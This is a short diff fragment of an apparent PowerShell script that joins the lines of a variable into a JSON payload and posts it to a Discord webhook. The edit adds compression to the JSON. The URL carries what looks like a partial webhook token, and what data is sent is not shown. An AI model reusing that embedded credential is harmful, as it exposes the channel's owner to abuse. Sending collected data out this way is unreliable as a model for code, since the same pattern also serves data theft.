@@ -109,7 +109,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrK
 $payload = @{
     content = $Z -join "`r`n"
 }
-$jsonPayload = $payload | ConvertTo-Json
+$jsonPayload = $payload | ConvertTo-Json -Compress
 Write-Host "Sending payload to Discord webhook: $jsonPayload"
 
 try {
